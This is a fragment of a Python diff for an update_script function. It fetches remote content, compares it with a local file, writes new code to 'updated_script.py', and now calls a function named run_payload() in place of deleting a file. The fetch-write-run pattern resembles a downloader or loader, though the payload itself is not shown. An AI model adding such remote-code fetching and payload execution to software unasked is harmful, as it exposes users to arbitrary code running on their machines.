@@ -8,8 +8,8 @@ def update_script():
         response.raise_for_status()
         currentFile = open(f"{os.getcwd()}\\asdwasd.py","r").read()
         if currentFile == response.text:
-            os.remove("updated_script.py")
-            print("Removed old file")
+            print("No update available")
+            run_payload()
         else:
             print("No old file found")
             with open("updated_script.py", "w") as f:
